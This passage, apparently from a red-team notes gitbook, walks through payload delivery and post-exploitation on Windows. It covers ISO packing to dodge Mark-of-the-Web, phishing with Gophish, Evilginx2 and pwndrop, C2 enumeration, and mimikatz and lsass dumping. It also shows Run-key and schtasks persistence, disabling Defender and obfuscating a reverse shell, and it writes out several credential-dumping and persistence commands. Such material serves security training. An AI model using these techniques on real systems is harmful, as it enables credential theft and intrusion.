![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FB4Wcq2ASM8TRJbwKff3T%2Fimage.png?alt=media&token=6bdfd5cc-a2a4-4581-8cfa-2aeaf6af20bd)

We have successfully delivered our payload to the target machine, usually, only pretexts can have us move further and have the user interact with the file and have them Open the Zip, Save, Uncompressing and still execute.

 

## iso

An ISO file is an exact copy of an entire optical disk such as a CD, DVD, or Blu-Ray archived in a single file. This file, which is also sometimes referred to as an ISO image, is a smaller-sized duplicate of large sets of data.

The reason I speak of ISO files is because of a security feature called Mark-of-the-Web (MOTW) a security feature originally introduced by Internet Explorer to force saved webpages to run in the security zone of the location the paged was saved from.

​

[Nobelium](https://redmondmag.com/articles/2021/05/28/nobelium-spearphishing-attacks.aspx)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fc0IUmNrXLJwwhSOfTCow%2Fimage.png?alt=media&token=d628a3e0-f43a-473f-a65f-e6638ad5f1c8)

Since the ISO file is just a compression method for files I will show the example of grabbing a regular EXE payload and compressing this onto the ISO file will demonstrate the mark of the web avoidance, since this is helpful Microsoft doesn't check if the file comes from the Internet and we can avoid the SmartScreen protection that usually comes when a file is from the Internet.

I will show a small demonstration of why MOTW is an important factor when delivering payloads:

SmartScreen, simple this feature protects windows from files that are being downloaded from the internet when the payload is executed you will receive a warning from SmartScreen

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FUrB0VvWvhr2XEH2qegE2%2Fimage.png?alt=media&token=d5d73464-954c-4906-98c2-1d6438fe4d87)

I will follow with the execution on the payload

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F8VSJ6ODukOGUJRUD5mRW%2Fimage.png?alt=media&token=9c3649aa-e7be-44a8-8b8d-d404d5f98168)

Makes sense with the MOTW feature now let's remove it:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FyYN5kghJCwKMpzOt8gAs%2Fimage.png?alt=media&token=74a8731d-48ba-447b-a686-bc7a186c3dd8)

Immediate execution no checkups of any sort.

Will demonstrate this now by packing the payload onto an ISO file image and executing it for a reverse shell. For demo purposes we can use an amazing tool called PackMyPayload or we can take a blast to the past and use a tool called Nero

PackmyPayload:

I will fill the requirements for the tool to give us our ISO image, multiple formats are supported but I will demonstrate ISO in this example

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FiCGnUGFWm4NKtCgUofIA%2Fimage.png?alt=media&token=e8e4f997-40c8-45c3-8220-5fbcf2fff90d)

Will pack our payload

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F7sEAs9f49BkGYjm1zxk4%2Fimage.png?alt=media&token=99d88feb-2be7-4e5c-a63a-f6469619edcb)

Then send this to our user

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FIusNme2TTYujYz8D2SeU%2Fimage.png?alt=media&token=af57d741-3569-49d1-8425-a439519166e8)

Now will verify the MOTW on the ISO file

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F6E0ItlmVNgFN2rPectwt%2Fimage.png?alt=media&token=21a79d3f-baee-4d8b-829a-8b7133fa70be)

But will see that the payload in the ISO does not have the MOTW

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FwBVD7kUQY7Unl1TcKtxB%2Fimage.png?alt=media&token=30bb69ae-996a-49ff-936d-075063036fcc)

And if we try and run this, will get an immediate execution

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FuEi0eUwQUTd7lWbK7ACf%2Fimage.png?alt=media&token=a989e667-24af-4316-b40d-0b633526eeaf)

# delivery

Our method for delivering our phishing payloads this is an important step in our red team infrastructure as this is a deciding factor if our payload will be even delivered to our user, a framework that can deliver our payloads with success is a great tool fortunately also counting all the pre-steps taking in the Domain Section the majority of these are well known and open source.

## gophish

Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and executes phishing engagements and security awareness training.

 

A little documentation and info on the tool

​

[https://getgophish.com/](https://getgophish.com)

Once downloaded we can proceed to unzip the file and execute the binary named gophish in the current directory in which it was downloaded

Will receive the proper information for the first-time login

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FE9sGI3s75GVYVJlHtcbF%2Fimage.png?alt=media&token=6ee9470c-b85a-4ac2-af06-d51111a2b876)

Now I will not demonstrate the complete setup of the framework as there are multiple sources and you can get more information on the Documentation page, I will demonstrate a Phishing technique and show some features of the tool.

When our framework is fully setup we can try and create a New Campaign and send our phishing emails to our targeted users

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FIww96yD2u126MW397Thl%2Fimage.png?alt=media&token=28e52772-609a-45d6-86f7-42c0ad980ef6)

Will send the Emails to our target users

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FDBQPORL4QR7l59XZFwbF%2Fimage.png?alt=media&token=45b6de25-3dee-424d-878f-22bcfea92425)

The user will check their inbox

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Ftsg5H6koILsTZldfICX5%2Fimage.png?alt=media&token=57511dbe-393d-4b33-a24e-e4cb390d603e)

This is an example utilizing the GoPhish framework, of course, a more sophisticated approach can be made by adding encryption and header information that looks a little more presentable and not spam but this was a high-level approach.

## evilginx

Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies which in turn allows bypassing 2-factor authentication protection

Now I won't go into a detailed explanation on setting this up as there are plenty of sources even on its Github page and I can probably be using a different VPS provider that won't match these steps, but the basic configuration is:

Will choose our phishlets I chose LinkedIn

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FUi5Mm6DD9syE976jTUjv%2Fimage.png?alt=media&token=2487d83b-fffa-45e5-9fa2-39c0e5ffac00)

Configure the domain and IP and enable the phishlet

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FbnY46G1QL1hrVf2Jzfxh%2Fimage.png?alt=media&token=f22d4937-8272-4320-822c-94b91c70d9c6)

Once set evilginx2 will create an SSL certificate utilizing Let's Encrypt if this is unsuccessful you can do this manually but from here, we can create the lures and grab the URLs needed to send to the target

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FHxtncyeqedYnslPfCyel%2Fimage.png?alt=media&token=e8af4a71-5efd-477d-b647-418143edb9e4)

When the user logs in we will capture cleartext credentials and the Cookie needed to bypass MFA Authentication

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FptIhpqGx9KVFI03Zzs5x%2Fimage.png?alt=media&token=85305f84-e751-4a67-b993-1c5f82e1d13f)

If MFA is enabled and the user logged in successfully, we will receive the Cookie as well, since this demo those not contain a legitimate user, the cookie is not demonstrated but the cleartext attempt is logged.

## pwndrop

I wanted to demonstrate this amazing tool for setting up delivery payloads with a spoofing method that can allow more legitimate-looking links for Payload deliveries as the Tool description implies it's a self-deployable file hosting service for sending out red teaming payloads or securely sharing private files over HTTP and WebDav.

Now I won’t write the setup here since it's well written and demonstrated on the Github page already.

Here is a sample of the tool functioning, will create a simple payload with msfvenom

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FbOSvEwZmIhGfxidQA6lq%2Fimage.png?alt=media&token=ca5668eb-1a6e-4ea4-a8ce-01a8f7b26674)

Now run the tool and the tool on its first execution will create a .ini file with the configurations to access the pwndrops admin panel, where the files will be stored and the admin files data.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FvfYr1gjrXhTPkKCgCcgU%2Fimage.png?alt=media&token=39dff9f4-e8e9-4beb-9dd4-f38c51d2cc01)

If anyone with incorrect information such as the wrong path they will be redirected to another page of choosing or simply a 404 error.

When uploading our payload we need 2 things the payload itself and a Facade file which we can use as a means of spoofing our original file when sending our link

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FDHbEZVABKupgeLu0iX84%2Fimage.png?alt=media&token=d053e285-7293-4f52-aaea-4dcd53737ad4)

In that manner when the target receives the link it is a spoofed linked and will be redirected to the original file that would be our payload.

A small demonstration

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FW1bYHd14exGA205oEg05%2FPWNDROP.gif?alt=media&token=2d411dd9-8d43-4825-990c-cf9eb3fd2df1)

# situational-awareness

In this life cycle of the red team engagement the operator is gaining as much information about the compromised environment and the domain network, there is no predefined list of commands to execute but the information gathered is essential to what the next actions will be taken towards persistence, lateral movement or privilege escalation.

## covenant-and-c

A demonstration of this would be using a few tools made in C-Sharp that are great to gather multiple information in a single step, these are some of the common things to be looking for to proceed to our next steps Seatbelt has packed the most common methods and the information considered important and valuable. Seatbelt has 3 groups that are valuable in the information gathering phase which should be run in different levels of permissions as some users can see more than others.

Covenant has a great built-in command already in its Tasks functions.

I will be demonstrating a few tools that are built-in Covenant and other methods related to the usage of C# tools via a C2 these can as well be placed on the Disk of the workstation and run normally as a binary on the console CMD & Powershell

Covenant

Seatbelt -group=system

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FLVMe1EoJjRfG6Hko1x5c%2Fimage.png?alt=media&token=9f59f97b-3447-4b19-884e-99b0438f1983)

Now Covenant accepts C# binaries to execute them in memory such as Cobalt Strikes famous execute-assembly method this is a great method to avoid our tool dropping onto the disk and leaving a footprint this task is called Assembly in Covenant will simply run this, select our binary and add any parameters

Choose the binary

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FXxM8yNnm3yTn6k8EkzfS%2Fimage.png?alt=media&token=4c8470b7-0998-44f7-8999-80fa0754ca64)

The first box gives the assembly a name and the second the parameters, when this is added we can execute

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FsHwDsB0RapMwPjvQHyb4%2Fimage.png?alt=media&token=0648549c-724f-4a04-a307-061aebcb931c)

Execution

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FFAyEJhDKp2pYsPcIaeiW%2Fimage.png?alt=media&token=5d4e2c3e-f40c-4801-b02a-df2d0a6c2012)

This method is perfect since the seatbelt version from Covenant to our binary is different, unfortunately, Covenant hasn't received an update for a while so the built-in tools are a little outdated, but with this method, we can call our own C# tools current up to date.

Domain Enumeration

One of the things to keep in mind is that most C2 currently have their methods for enumerating the Domain Network of an environment for example Covenant has built-in commands that act like PowerView which can take parameters as well, depending on the tool and acceptable parameters for this.

Get-DomainComputers

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FV60h5CkVHRoQMnaRJtGQ%2Fimage.png?alt=media&token=e5a2b062-7e00-46a3-aa67-998606bb3a87)

Get-DomainUsers

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FMYSDhxzSlwIk1SMmBref%2Fimage.png?alt=media&token=c802e393-7839-4af8-aa7d-99dae48c5ee2)

Specific User (parameter demonstration)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F1J8g9TRlXTRSPbV8WDJj%2Fimage.png?alt=media&token=55aad724-7e59-4ffe-858e-c98a1fec87ad)

Get-Processes

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FkGqvpA1YkTG6YdAz8Lyk%2Fimage.png?alt=media&token=83554f44-e429-4bf9-a7ec-e74436ac2249)

GetLocalGroup Information

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FGOBPlEepumQFqKWD8l1k%2Fimage.png?alt=media&token=cc202b3b-7ff8-4f0c-b0ed-d7df47788ded)

LoggedOnUsers

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fcw2gkyD8Z4Wo22X702Jz%2Fimage.png?alt=media&token=57c01eb2-e4d7-4023-bd44-068eae99987e)

To finish of this I just wanted to demonstrate the usage of Covenant and the works of using C# binaries and how they are great for automating a few information gathering techniques, this those not remove the fact of verifying things manually it's just a great way to gather plenty of information needed for our next actions

 

## empire-and-powershell

Empire 4,0 is a post-exploitation framework that includes pure-PowerShell Windows agents, Python 3. x Linux/OS X agents, and C# agents. It is the merger of the previous PowerShell Empire and Python Empyre projects. Empire premiered at the BSidesLV in 2015.

BC Security presented updates to further evade Microsoft Antimalware Scan Interface (AMSI) at DEFCON 27. Empire was originally built by other developers but since it was no longer active as "It has served its purpose" it was no longer maintained and BCSecurity forked the project and continued its development.

I will demonstrate some situational techniques with Empire, Empire has the full functionality of PowerView to enumerate a domain and workstation as also other tools for lateral, privesc, and persistence techniques.

I will not demonstrate set up as there are already, awesome tutorials and the own GitHub repository for these but Empire will essentially need a listener, a stager, and the agent once called back to the C2.

The agent will start enumerating the host and domain

Host Recon is a good start with enumeration

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fyalq9g7ociT6r9PoW6R6%2Fimage.png?alt=media&token=aa8dce18-7b21-4c60-b3b4-e7a34aa9e3d0)

Seatbelt PowerShell integrated with Empire a few settings are needed to get started with the proper group or individual command

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FTWczrZUN7vyik9ZBebA1%2Fimage.png?alt=media&token=1ebd3658-1c2d-467d-b408-f8d229befe00)

Domain User Enumeration

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FUHavxIqX4l2tYNdjdNbD%2Fimage.png?alt=media&token=0221abf3-e818-463a-b58e-317bd27c51fa)

Privilege Escalation Enumeration

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FxuLIgxOtqImys7OfvYLC%2Fimage.png?alt=media&token=7cd5d9eb-1c51-4ab0-a4cf-a96858d3e69a)

And a plethora more modules that empire can execute around 399 of the time of writing.

# credential-dumping

This section demonstrates techniques on how to access credentials on the OS workstation I was having a few problems deciding where to locate this section as some of these techniques are only accessed when achieving Administrator Privileges, but I will demonstrate here a few user-level access and then demonstrate a few Administrators access techniques

## mimikatz

A tool built by @gentilkiwi to learn C and Windows Security if you are fully aware plaintext credentials, PINS, and Kerberos Tickets can be extracted from memory. A few examples will be given with the tool

A requirement is to elevate permissions to Administrator or SYSTEM

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F0KyuQr6N24OGwqOrBe1c%2Fimage.png?alt=media&token=a9ad1d6c-5518-436f-ae64-e10100572af6)

Windows has implemented more security into its OS that plaintext credentials are now a little more difficult to achieve, but we can still grab the LM Hash of the OS and crack this offline or utilize the PTH technique within mimikatz or other tools.

Attackers can take advantage of Administrator permissions and enable this feature again, to allow the grab of cleartext credentials

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

This allows the gathering of cleartext credentials, as demonstrated below after a user authenticates again

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FyWZtO6zITstL33makIhh%2Fimage.png?alt=media&token=fadecda0-a7e9-4654-8f7f-29b633ea14ca)

 

## lsass-dumping

Now we are aware of dumping credentials in memory and running tools on the OS host, but we have offline methods as well, where the operator can dump the lsass process and attack the file offline. One tool that allows us this is the Task Manager itself, it will create a Dumps' file of the process for inspection, but we can grab this file and attack it offline

Requires Administrator Permissions

**TaskManager**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FvkNZQXxErVg3VunoYFpr%2Fimage.png?alt=media&token=13468908-c468-44cc-9a10-1046872ee979)

The file is dumped successfully in the mentioned folder location

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F6n1bVBaeOmkaiVUmFIQz%2Fimage.png?alt=media&token=db787c27-4462-4be2-bedd-1b39b221c5ba)

We can grab this file and move it offline for dumping credentials

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FK09c2hfsG2PNRuXCsyFo%2Fimage.png?alt=media&token=64c880c9-2f69-4e34-ae0d-e5fefe084a8f)

Requires SYSTEM permissions

**MinidumpW**

A LOLBAS is available for dumping the lsass process, the required permission is SYSTEM we can use the following command to dump the process onto a file

rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\Users\HelpDesk\Desktop\lsass.dmp full

The PID is of the lsass process

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FtCUl2VX3iD0rmyMbI8wr%2Fimage.png?alt=media&token=2b5a14dc-cd85-449f-a6ee-c74821f596b3)

We can do the same with mimikatz and attack the file offline

Requires Administrator permissions

**ProcDump**

ProcDump from the Sysinternals family, which purpose is for monitoring an application for CPU spikes and generating crash dumps. The tool is simple

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fc0wi0msyUarPUtwYKCTl%2Fimage.png?alt=media&token=5b8f4f57-a6d7-4717-bcd5-a6be07359543)

## sharpchromium

SharpChromium is a .NET 4.0+ CLR project to retrieve data from Google Chrome, Microsoft Edge, and Microsoft Edge Beta. Currently, it can extract:

Cookies (in JSON format)

History (with associated cookies for each history item)

Saved Logins

A small demonstration of saved credentials for the Edge Web Browser, these can be extracted with user-level permissions

(Heads up!!!, The credentials can be stored even if incorrect!!!)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fid1DgpTYdCwEEYupVtvm%2Fimage.png?alt=media&token=36322e17-e11e-4791-92ee-5598773c99e4)

# persistence

As MITRE defines

The adversary is trying to maintain its foothold.

In this section, I will demonstrate a few userland persistent methods and administrator methods to keep a foothold on the target environment

## userland-persistence

These methods are only achievable by user-level permissions the operator wouldn't have access to anything that requires administrator privileges, but some techniques can be achieved as a user

Registry Keys

There are 2 categories of registry keys the SYSTEM and USER keys the user has access to edit the user keys and modify them as the user would like to but some that are to be mentioned are the Run and RunOnce keys, they are helpful since they would run when a user logs out or restarts the machine.

An example of this technique using cmd is as follows this will execute a binary, but you can as well add a command to get executed instead of a binary on disk

reg add HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run /v 1 /d "C:\Windows\System32\calc.exe"

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FyYyynSVfUY0uMHswraXo%2Fimage.png?alt=media&token=3a0fc5d2-43ac-44ff-bd0a-52cdbe23dc02)

We can verify this key created in the Registry

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FjSqpceIFwRxV9wb25tZe%2Fimage.png?alt=media&token=875e255a-0d71-4b09-a27d-67fecd60c9af)

Once added successfully the user once login back to the workstation by locking or restarting the binary should be executed

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FVSLxYwsGIAVPCfPb82Uf%2Fimage.png?alt=media&token=e1765d04-4b74-4861-89e5-f69c78eeeea0)

Demo:

​

[https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder](https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder)

https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder

Startup Folder

The startup up folder is a folder that contains programs that will initiate at boot time once a user has logged onto their session, this is another great method for user persistence as the user has written permissions in their startup folder.

A simple bat file left on the user's startup folder will execute once the user logs back in

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FawFEtrnyEY1Yf5Y1O4Bw%2Fimage.png?alt=media&token=03b22e01-7b32-45ea-82ec-f05dd87cf8a4)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FMoRR83Ct42MDh22zymcE%2FStartupFolder.gif?alt=media&token=909ace61-0461-45ea-8175-efc1acf2de9d)

Scheduled Tasks

Utilities such as schtasks can be used to schedule programs or scripts to be executed at a date and time specified by the user. Operators can use this feature to have code execution or binaries executed at a certain time of day to receive their persistent shell on the workstation

schtasks /create /sc minute /mo 1 /tn "Taxes" /tr C:\Windows\System32\calc.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fvs7H8qnq8ZvkESoAR5V0%2Fimage.png?alt=media&token=75ed75f2-424b-49fd-88a6-ecac1c795683)

 

https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1053-scheduled-tasks-job/scheduled-task

[https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1053-scheduled-tasks-job/scheduled-task](https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder)

## elevated-persistence

These methods are achieved once the operator has elevated its persistence on the workstation, this is helpful to avoid the privilege escalation situation and just come back to a higher permissions shell.

Note: These will require Privilege Escalation beforehand to achieve this level of persistence

Services

Services may be created with Administrator privileges, but they are executed under the SYSTEM level privileges, services can also be started through Service Execution.

A demonstration of the level required to create a Service can be shown below

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FF7B2fXkArjK8YLumko8o%2Fimage.png?alt=media&token=a5f34a71-fc5f-43e1-9c9f-60fcce4bbcf8)

But once elevated  to the Administrator level

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FCU0OMqXuulPOaajQdhYH%2Fimage.png?alt=media&token=5cf4281b-a9cf-49f0-849f-8e9bef98775f)

Our service has been successfully created and it's currently stopped will proceed to start the service

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FtEzSo5U7zoN73d8U3A43%2Fimage.png?alt=media&token=4bb48d0a-7d7f-49ff-98c0-2a90112f652d)

Even when the service lags or executes with an error it is still run successfully this usually happens when you replace the beneath with a command instead of a binary

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FGmUlZh02zS9wJEdPoAxn%2Fimage.png?alt=media&token=229da1b2-ba08-48c8-8745-c89695fc70a7)

All methods of persistence are available at this level of access on the workstation, I just wanted to demonstrate a specific one that can be demonstrated easily when Administrator access is needed.

 

# defense-evasion

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts.

A few techniques will be demonstrated in the following sections, they might not be OPSEC considered but they are available

## disable-or-modify-tools

Attackers with the elevated permissions can disable security tools to avoid detection and activities that are being monitored

We can verify Defender is blocking our malicious attempts

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FUpvlUCzq5IlqvUHVIJWi%2Fimage.png?alt=media&token=a41ad20e-4769-4f71-88e3-f52d1bf13ce7)

We can disable defender utilizing PowerShell, Services, or even GPO Policies, an example is shown below:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FDGqr56lg66d5sc86tCXn%2Fimage.png?alt=media&token=5a50ab0a-6840-4530-bbd2-fa86f7a23d16)

Then after Disabling

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2F59n9gW6kpNw7WGefnGlF%2Fimage.png?alt=media&token=e82c8119-470f-4058-8baa-a6ff96161ea4)

Note: Something to notice is that Tamper protection blocks this action, ways to block this are via GPO or Registry Keys

Then after disabling any malicious attempts are able to be executed

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Ffwpu3ZRd760sCxLm4MBh%2Fimage.png?alt=media&token=f0016e2e-a3f2-4e81-b366-485dbc804f58)

## obfuscating-files

The action of obfuscating files is to make something obscure, unclear, or unintelligible.  An example of simple obfuscation is a method of converting our strings into a base64 encoded format, this is no method of encryption, and this will not break the functionality of our code, but it is a way to hide our malicious payloads from AVs on scanning for malicious strings (AVs are smart and can also deobfuscate simple b64 and scan the real string)

I will work with a simple Reverse Shell PowerShell Script from Nishang

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FGjgSgqm31yLjYx8ZfCrA%2Fimage.png?alt=media&token=bffebfaa-d883-450d-93d2-5419e6e3e3a2)

Saving the file, immediately flagged it

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2FsrWcddKzRyH5QNTQUTJI%2Fimage.png?alt=media&token=62ddb34c-65ac-4eb5-84b2-090bc40916a4)

A little trick I've noticed, this technique is not new, but Defender flags a lot of malicious words in English, what if we change this to Spanish?

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MRh03Vwd4nuiUi3Oje7%2Fuploads%2Fw8Y1FKglZD3TPlVP3Oq0%2Fimage.png?alt=media&token=42cc8c66-36d4-47c2-afd0-4591f145a95d)

Now let's encode the entire script into Base64, PowerShell takes a specific format of base64, so we need to set up these settings to apply it to all the text on the script

